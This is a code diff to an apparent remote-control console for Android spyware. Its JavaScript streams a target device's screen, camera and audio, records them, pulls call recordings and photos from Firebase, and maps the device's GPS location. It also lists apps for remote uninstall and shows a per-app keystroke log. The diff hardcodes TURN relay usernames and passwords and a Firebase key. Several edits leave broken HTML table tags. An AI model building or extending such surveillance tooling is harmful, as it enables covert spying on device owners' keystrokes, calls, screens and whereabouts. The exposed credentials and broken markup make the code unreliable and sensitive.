@@ -290,7 +290,15 @@
 const CONFIG = {
     WS_URL: "wss://mirror-view.onrender.com",
     MAX_RECONNECT_DELAY: 30000,
-    ICE_SERVERS: [{ urls: "stun:stun.relay.metered.ca:80" }],
+    ICE_SERVERS: [
+        { urls: "stun:stun.l.google.com:19302" },
+        { urls: "stun:stun1.l.google.com:19302" },
+        { urls: "stun:stun.relay.metered.ca:80" },
+        { urls: "turn:global.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turn:global.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turn:global.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turns:global.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
+    ],
     FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app", messagingSenderId: "634777347775", appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a" }
 };
 firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
@@ -307,7 +315,7 @@ let screenMediaRecorder = null, screenRecordedChunks = [];
 let currentCameraStream = null, currentAudioStream = null;
 let socialMsgsData = [], currentLocation = null;
 let deviceInfoRefreshInterval = null;
-let currentMapType = 'street'; // 'street' or 'satellite'
+let currentMapType = 'street';
 
 const panel = document.getElementById('main-panel');
 const statusEl = document.getElementById('status');
@@ -434,14 +442,15 @@ function sendCommand(cmd,params={}){
 }
 function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }
 
-// ==================== WEBRTC (simplified but functional) ====================
-function createPeerConnection(type,onTrack,useMic){
-    const pc=new RTCPeerConnection({iceServers:CONFIG.ICE_SERVERS});
+// ==================== WEBRTC (enhanced for screen share) ====================
+function createPeerConnection(type, onTrack, useMic, iceServers = CONFIG.ICE_SERVERS){
+    const pc = new RTCPeerConnection({ iceServers: iceServers });
     if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
-    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic)pc.addTransceiver('audio',{direction:'recvonly'}); }
+    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic) pc.addTransceiver('audio',{direction:'recvonly'}); }
     else if(type==='audio') pc.addTransceiver('audio',{direction:'recvonly'});
-    pc.ontrack=onTrack;
-    pc.onicecandidate=e=>{ if(e.candidate) sendSignaling({type:'ICE_CANDIDATE',candidate:e.candidate,streamType:type}); };
+    pc.ontrack = onTrack;
+    pc.onicecandidate = e => { if(e.candidate) sendSignaling({type:'ICE_CANDIDATE', candidate:e.candidate, streamType:type}); };
+    pc.oniceconnectionstatechange = () => console.log(`${type} ICE state:`, pc.iceConnectionState);
     return pc;
 }
 function sendSignaling(msg){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'SIGNALING',deviceId:selectedDeviceId,data:msg})); }
@@ -449,23 +458,177 @@ function handleSignaling(msg){
     if(msg.type==='ANSWER'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc) pc.setRemoteDescription(new RTCSessionDescription({type:'answer',sdp:msg.sdp})); }
     else if(msg.type==='ICE_CANDIDATE'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc&&msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
 }
+
+// ==================== SCREEN SHARE (fixed modal buttons) ====================
 async function toggleScreen(){
     if(screenActive){
         if(screenPC)screenPC.close(); screenPC=null; screenActive=false;
         document.getElementById('screenBtn').innerText='Start Screen';
         document.getElementById('screenModalOverlay').classList.remove('show');
         sendSignaling({type:'STOP_SCREEN'});
-    }else{
+        // Stop any ongoing recording
+        if(screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
+        screenMediaRecorder = null;
+        screenRecordedChunks = [];
+        const modalVideo = document.getElementById('modalScreenVideo');
+        if(modalVideo) modalVideo.srcObject = null;
+    } else {
         document.getElementById('screenModalOverlay').classList.add('show');
         document.body.classList.add('modal-open');
-        document.getElementById('modalScreenVideo').srcObject=null;
-        screenPC=createPeerConnection('screen',e=>{ document.getElementById('modalScreenVideo').srcObject=e.streams[0]; },false);
-        const offer=await screenPC.createOffer(); await screenPC.setLocalDescription(offer);
-        sendSignaling({type:'OFFER',sdp:offer.sdp,streamType:'screen'});
-        document.getElementById('screenBtn').innerText='Stop Screen';
-        screenActive=true;
+        const modalVideo = document.getElementById('modalScreenVideo');
+        if(modalVideo) modalVideo.srcObject = null;
+        screenPC = createPeerConnection('screen', e => {
+            const modalVideo = document.getElementById('modalScreenVideo');
+            if(modalVideo && e.streams[0]) {
+                modalVideo.srcObject = e.streams[0];
+                console.log('Screen stream received');
+            }
+        }, false);
+        try {
+            const offer = await screenPC.createOffer();
+            await screenPC.setLocalDescription(offer);
+            sendSignaling({type:'OFFER', sdp:offer.sdp, streamType:'screen'});
+            document.getElementById('screenBtn').innerText='Stop Screen';
+            screenActive = true;
+            // Reset recording state
+            if(screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
+            screenMediaRecorder = null;
+            screenRecordedChunks = [];
+            document.getElementById('modalRecordBtn').innerText = '🔴';
+        } catch(e){
+            console.error('Screen share failed:', e);
+            showNotification('Failed: ' + e.message);
+            screenPC = null;
+            document.getElementById('screenModalOverlay').classList.remove('show');
+            document.body.classList.remove('modal-open');
+        }
     }
 }
+
+// Snap screenshot from modal video
+function snapScreenFromModal() {
+    const video = document.getElementById('modalScreenVideo');
+    if(!video || !video.videoWidth) {
+        alert('No active screen share or video not ready yet. Please wait a moment.');
+        return;
+    }
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.download = `screen-${Date.now()}.png`;
+        a.href = url;
+        a.click();
+        URL.revokeObjectURL(url);
+        showNotification('Screenshot saved');
+    }, 'image/png');
+}
+
+// Toggle screen recording (using canvas capture for reliability)
+function toggleScreenRecording() {
+    const video = document.getElementById('modalScreenVideo');
+    if(!video || !video.srcObject) {
+        alert('No active screen share. Start screen share first.');
+        return;
+    }
+    if(screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+        screenMediaRecorder.stop();
+        document.getElementById('modalRecordBtn').innerText = '🔴';
+        showNotification('Recording stopped');
+    } else {
+        // Wait for video to have dimensions
+        if(video.videoWidth === 0) {
+            video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
+        } else {
+            startScreenRecording();
+        }
+    }
+}
+function startScreenRecording() {
+    const video = document.getElementById('modalScreenVideo');
+    if(!video || !video.videoWidth) {
+        alert('Video not ready. Please wait.');
+        return;
+    }
+    screenRecordedChunks = [];
+    // Create a canvas that mirrors the video
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    const drawFrame = () => {
+        if(video.videoWidth && video.videoHeight) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        }
+        requestAnimationFrame(drawFrame);
+    };
+    drawFrame();
+    const canvasStream = canvas.captureStream(30);
+    // Add audio tracks if any from the original stream
+    const originalStream = video.srcObject;
+    if(originalStream && originalStream.getAudioTracks().length) {
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+    }
+    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+    screenMediaRecorder.ondataavailable = e => {
+        if(e.data.size > 0) screenRecordedChunks.push(e.data);
+    };
+    screenMediaRecorder.onstop = () => {
+        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `screen-recording-${Date.now()}.webm`;
+        a.click();
+        URL.revokeObjectURL(url);
+        screenRecordedChunks = [];
+        showNotification('Recording saved');
+    };
+    screenMediaRecorder.start(1000); // collect chunks every second
+    document.getElementById('modalRecordBtn').innerText = '🟢';
+    showNotification('Recording started');
+}
+
+function toggleFullscreen() {
+    const video = document.getElementById('modalScreenVideo');
+    if(!video) return;
+    if(!document.fullscreenElement) {
+        video.requestFullscreen().catch(err => console.warn('Fullscreen error:', err));
+    } else {
+        document.exitFullscreen();
+    }
+}
+
+function closeScreenModal() {
+    if(screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+        screenMediaRecorder.stop();
+    }
+    document.getElementById('screenModalOverlay').classList.remove('show');
+    document.body.classList.remove('modal-open');
+    if(screenActive) {
+        // Stop the screen share
+        if(screenPC) screenPC.close();
+        screenPC = null;
+        screenActive = false;
+        document.getElementById('screenBtn').innerText = 'Start Screen';
+        sendSignaling({type:'STOP_SCREEN'});
+    }
+    // Clear video source
+    const modalVideo = document.getElementById('modalScreenVideo');
+    if(modalVideo) modalVideo.srcObject = null;
+    document.getElementById('modalRecordBtn').innerText = '🔴';
+}
+
+// Attach modal button listeners (ensuring they exist)
+document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
+document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
+document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
+document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);
+
+// ==================== CAMERA MODAL (unchanged but functional) ====================
 function showCameraModal(stream, cameraType){
     const modal=document.getElementById('cameraModalOverlay');
     const video=document.getElementById('modalCameraVideo');
@@ -679,7 +842,6 @@ async function showCallRecordingsPanel() {
     panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from Firebase...</p>';
 
     try {
-        // Try subcollection under device (best practice – no userId needed)
         let snapshot = null;
         try {
             snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
@@ -688,7 +850,6 @@ async function showCallRecordingsPanel() {
         } catch(e) { /* fallback to top‑level */ }
 
         if (!snapshot || snapshot.empty) {
-            // Top‑level collection – must filter by userId!
             snapshot = await db.collection('call_recordings')
                 .where('deviceId', '==', selectedDeviceId)
                 .where('userId', '==', currentUser.uid)
@@ -732,7 +893,6 @@ async function showCallRecordingsPanel() {
         html += '</div>';
         panel.innerHTML = html;
 
-        // Attach download handlers
         document.querySelectorAll('.download-recording-btn').forEach(btn => {
             btn.addEventListener('click', async (e) => {
                 const url = btn.getAttribute('data-url');
@@ -791,7 +951,6 @@ async function showPhotoGalleryPanel() {
     }
     panel.innerHTML = '<h3>🖼️ Photo Gallery</h3><p>Loading photos from Firebase...</p>';
     try {
-        // Query photos from Firestore collection "photos" (or subcollection under device)
         let snapshot = null;
         try {
             snapshot = await db.collection('devices').doc(selectedDeviceId).collection('photos')
@@ -875,7 +1034,7 @@ function showFullPhoto(imageUrl, photoId, storagePath) {
             if(storagePath) await storage.ref(storagePath).delete();
             showNotification('Photo deleted');
             modal.remove();
-            showPhotoGalleryPanel(); // refresh
+            showPhotoGalleryPanel();
         } catch(e) { showNotification('Delete failed: ' + e.message); }
     };
     document.getElementById('closeModalBtn').onclick = () => modal.remove();
@@ -888,7 +1047,6 @@ function renderMap(loc){
     const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
     currentLocation={lat,lon,acc};
     
-    // Build map container with a toggle button
     panel.innerHTML = `
         <div style="position:relative;">
             <div id="map" style="height:400px; border-radius:12px;"></div>
@@ -904,7 +1062,6 @@ function renderMap(loc){
     
     if(mapInstance) mapInstance.remove();
     
-    // Define tile layers
     const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '&copy; OpenStreetMap contributors'
     });
@@ -912,15 +1069,12 @@ function renderMap(loc){
         attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
     });
     
-    // Start with street layer
     mapInstance = L.map('map').setView([lat, lon], 18);
     streetLayer.addTo(mapInstance);
     
-    // Add circle and marker
     L.circle([lat, lon], {radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2}).addTo(mapInstance);
     L.marker([lat, lon], {icon: L.divIcon({className:'current-location-marker', iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Device Location');
     
-    // Reverse geocoding
     fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
         headers: { 'User-Agent': 'SystemSync-Console/1.0' }
     })
@@ -934,7 +1088,6 @@ function renderMap(loc){
         document.getElementById('addressDisplay').innerHTML = '🌍 Address unavailable';
     });
     
-    // Map type toggle
     const toggleBtn = document.getElementById('mapTypeToggle');
     toggleBtn.addEventListener('click', () => {
         if(currentMapType === 'street') {
@@ -958,7 +1111,7 @@ function renderTable(rows, headers) {
     const start = currentPage * pageSize;
     const pageRows = rows.slice(start, start + pageSize);
     
-    let html = '<div style="overflow-x:auto;"><table><thead><tr>';
+    let html = '<div style="overflow-x:auto;"><table><thead></tr>';
     headers.forEach(h => html += `<th>${h}</th>`);
     html += '</thead><tbody>';
     pageRows.forEach(r => {
@@ -1051,7 +1204,7 @@ function displayWifiNetworks(data) {
 
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></tr></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
@@ -1069,7 +1222,7 @@ function displayAppUsage(data){
 
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></table></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><tr><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
 
